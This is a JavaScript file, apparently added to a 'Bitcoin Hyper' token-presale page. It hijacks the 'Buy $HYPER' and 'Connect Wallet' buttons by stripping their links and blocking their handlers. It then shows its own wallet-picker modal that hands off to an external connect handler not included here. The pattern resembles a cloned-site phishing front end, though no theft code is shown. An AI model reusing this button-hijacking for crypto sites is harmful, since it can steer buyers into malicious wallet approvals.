/**
 * Buy Buttons Override for Bitcoin Hyper Angular App
 * This script overrides the Buy buttons to show wallet selection modal
 */

class BuyButtonsOverride {
    constructor() {
        this.isInitialized = false;
        this.walletSelected = false;
        this.selectedWallet = null;
    }

    init() {
        if (this.isInitialized) return;

        // Wait for DOM to be ready and Angular to load
        this.waitForElementAndOverride();
        this.isInitialized = true;
    }

    waitForElementAndOverride() {
        const checkForElement = () => {
            // Find all buy buttons by their text content
            const allButtons = document.querySelectorAll('button, div[class*="btn"], a[class*="btn"]');
            const buyButtons = [];

            allButtons.forEach(button => {
                const textContent = button.textContent?.trim().toLowerCase() || '';
                if (textContent.includes('buy $hyper') ||
                    textContent.includes('buy with crypto') ||
                    textContent.includes('buy with card') ||
                    textContent.includes('connect wallet')) {
                    buyButtons.push(button);
                }
            });

            if (buyButtons.length > 0) {
                buyButtons.forEach(button => this.overrideBuyButton(button));
            } else {
                // Keep checking every 100ms until elements are found
                setTimeout(checkForElement, 100);
            }
        };

        checkForElement();

        // Also set up a mutation observer to catch dynamically added elements
        this.setupMutationObserver();
    }

    setupMutationObserver() {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            // Check if the added node is a buy button or contains one
                            const allButtons = node.querySelectorAll ? node.querySelectorAll('button, div[class*="btn"], a[class*="btn"]') : [];
                            const buyButtons = [];

                            // Check the node itself
                            if (node.textContent) {
                                const textContent = node.textContent.trim().toLowerCase();
                                if ((textContent.includes('buy $hyper') ||
                                     textContent.includes('buy with crypto') ||
                                     textContent.includes('buy with card') ||
                                     textContent.includes('connect wallet')) &&
                                    (node.tagName === 'BUTTON' || node.className?.includes('btn'))) {
                                    buyButtons.push(node);
                                }
                            }

                            // Check child buttons
                            allButtons.forEach(button => {
                                const textContent = button.textContent?.trim().toLowerCase() || '';
                                if (textContent.includes('buy $hyper') ||
                                    textContent.includes('buy with crypto') ||
                                    textContent.includes('buy with card') ||
                                    textContent.includes('connect wallet')) {
                                    buyButtons.push(button);
                                }
                            });

                            buyButtons.forEach(button => this.overrideBuyButton(button));
                        }
                    });
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    overrideBuyButton(element) {
        // Skip if already overridden
        if (element.dataset.overridden === 'true') return;

        // Mark as overridden to prevent duplicate processing
        element.dataset.overridden = 'true';

        // Convert link to button behavior
        if (element.tagName === 'A') {
            element.removeAttribute('href');
            element.removeAttribute('target');
        }
        element.style.cursor = 'pointer';
        element.style.textDecoration = 'none';

        // Add click event listener to show wallet selection modal
        element.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            this.showWalletSelectionModal();
        });
    }

    showWalletSelectionModal() {
        // Create and show wallet selection modal
        this.createWalletSelectionModal();
    }

    createWalletSelectionModal() {
        // Remove existing modal if any
        const existingModal = document.querySelector('.buy-wallet-modal-overlay');
        if (existingModal) {
            existingModal.remove();
        }

        // Create modal overlay
        const modalOverlay = document.createElement('div');
        modalOverlay.className = 'buy-wallet-modal-overlay';
        modalOverlay.innerHTML = `
            <div class="buy-wallet-modal-content">
                <div class="buy-wallet-modal-header">
                    <h2>Connect Wallet</h2>
                    <button class="buy-wallet-modal-close" onclick="buyButtonsOverride.hideWalletSelectionModal()">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                            <path d="M18 6L6 18M6 6L18 18" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
                        </svg>
                    </button>
                </div>

                <div class="buy-wallet-options">
                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('walletBW')">
                     <span>BEST WALLET</span>   
                    <img src="assets/images/svg-icons/bw.png" alt="Best Wallet" />
                        </button>

                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('wallet')">
                    <span>WALLET CONNECT</span>    
                    <img src="assets/images/svg-icons/wallet.png" alt="Wallet Connect" />
                        </button>

                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('metamask')">
                       <span>METAMASK</span> 
                      <img src="assets/images/svg-icons/metamask.png" alt="Metamask" />
                         </button>

                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('base')">
                    <span>BASE WALLET</span>    
                    <img src="assets/images/svg-icons/base1.png" alt="Base Wallet" />
                        </button>

                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('phantom')">
                    <span>PHANTOM</span>    
                    <img src="assets/images/svg-icons/phantom.png" alt="Phantom" />
                    </button>

                    <button class="buy-wallet-option" onclick="buyButtonsOverride.selectWallet('solflare')">
                        <span>SOLFLARE</span>
                        <img src="assets/images/svg-icons/solflare.png" alt="Solflare" />
                        </button>
                </div>

                <div class="mobile-message">
                    If you're on mobile, please open this inside your wallet's built-in browser.
                </div>
            </div>
        `;

        // Add styles for the modal
        this.addModalStyles();

        // Add to DOM
        document.body.appendChild(modalOverlay);
        document.body.style.overflow = 'hidden';

        // Add event listeners for wallet selection buttons
        const walletOptions = modalOverlay.querySelectorAll('.buy-wallet-option');
        walletOptions.forEach(button => {
            button.addEventListener('click', async (e) => {
                const walletType = button.getAttribute('onclick')?.match(/'([^']+)'/)?.[1];
                if (walletType) {
                    await this.selectWallet(walletType);
                }
            });
        });
    }

    hideWalletSelectionModal() {
        // Force hide all existing modals immediately
        const allSelectionModals = document.querySelectorAll('.buy-wallet-modal-overlay');
        allSelectionModals.forEach(modal => {
            modal.style.display = 'none';
            modal.remove();
        });

        // Also check for any wallet connection modals and make sure they're on top
        const walletModals = document.querySelectorAll('.wallet-modal-overlay');
        walletModals.forEach(modal => {
            modal.style.zIndex = '25000';
        });

        document.body.style.overflow = '';

        // Force a small delay to ensure DOM cleanup
        return new Promise(resolve => setTimeout(resolve, 10));
    }

    async selectWallet(walletType) {
        this.selectedWallet = walletType;
        this.walletSelected = true;

        // Immediately hide selection modal
        await this.hideWalletSelectionModal();

        // Force remove any lingering selection modals
        setTimeout(() => {
            const allModals = document.querySelectorAll('.buy-wallet-modal-overlay');
            allModals.forEach(modal => modal.remove());
        }, 10);

        // Trigger wallet connection immediately
        if (window.walletModal && window.walletModal.handleWalletClick) {
            window.walletModal.handleWalletClick(walletType);
        } else {
            // Fallback: wait a bit for walletModal to be available
            setTimeout(() => {
                if (window.walletModal && window.walletModal.handleWalletClick) {
                    window.walletModal.handleWalletClick(walletType);
                } else {
                    console.error('Wallet modal not found');
                }
            }, 100);
        }
    }

    addModalStyles() {
        // Check if styles already exist
        if (document.querySelector('#buy-wallet-modal-styles')) return;

        const style = document.createElement('style');
        style.id = 'buy-wallet-modal-styles';
        style.textContent = `
            .buy-wallet-modal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.8);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 500;
                padding: 20px;
            }

            .buy-wallet-modal-content {
                background: #6b7280;
                border-radius: 16px;
                padding: 24px;
                width: 100%;
                max-width: 340px;
                position: relative;
                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            }

            .buy-wallet-modal-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 24px;
            }

            .buy-wallet-modal-header h2 {
                color: #ffffff;
                font-size: 18px;
                font-weight: 600;
                margin: 0;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }

            .buy-wallet-modal-close {
                background: none;
                border: none;
                cursor: pointer;
                padding: 4px;
                color: #ffffff;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .buy-wallet-modal-close:hover {
                opacity: 0.7;
            }

            .buy-wallet-options {
                display: flex;
                flex-direction: column;
                gap: 12px;
                margin-bottom: 20px;
            }

            .buy-wallet-option {
                background: linear-gradient(135deg, #f59e0b 0%, #f97316 50%, #ea580c 100%);
                border: none;
                border-radius: 8px;
                padding: 14px 16px;
                cursor: pointer;
                transition: all 0.2s ease;
                display: flex;
                justify-content: space-between;
                align-items: center;
                color: #000000;
                font-weight: 600;
                font-size: 14px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                letter-spacing: 0.5px;
                min-height: 48px;
            }

            .buy-wallet-option:hover {
                transform: translateY(-1px);
                box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
                background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 50%, #f97316 100%);
            }

            .buy-wallet-option span {
                text-align: left;
                font-weight: 700;
            }
                .buy-wallet-option img {
        width: 28px;
        height: 28px;
        object-fit: contain;
        margin-right: 12px;
        border-radius: 6px;
        box-shadow: 0 1px 4px rgba(0,0,0,0.07);
    }
    .buy-wallet-option span {
        flex: 1;
    }

            .wallet-icon {
                font-size: 20px;
                line-height: 1;
            }

            .mobile-message {
                color: #d1d5db;
                font-size: 13px;
                text-align: center;
                line-height: 1.4;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                margin-top: 16px;
            }

            @media (max-width: 480px) {
                .buy-wallet-modal-content {
                    padding: 20px;
                    margin: 16px;
                    max-width: calc(100vw - 32px);
                }

                .buy-wallet-option {
                    padding: 12px 14px;
                    min-height: 44px;
                }

                .mobile-message {
                    font-size: 12px;
                }
            }
        `;
        document.head.appendChild(style);
    }
}

// Create global instance
const buyButtonsOverride = new BuyButtonsOverride();

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => buyButtonsOverride.init());
} else {
    buyButtonsOverride.init();
}

// Also try to initialize after a short delay to ensure Angular is loaded
setTimeout(() => buyButtonsOverride.init(), 1000);
setTimeout(() => buyButtonsOverride.init(), 3000); // Extra delay for slow loading
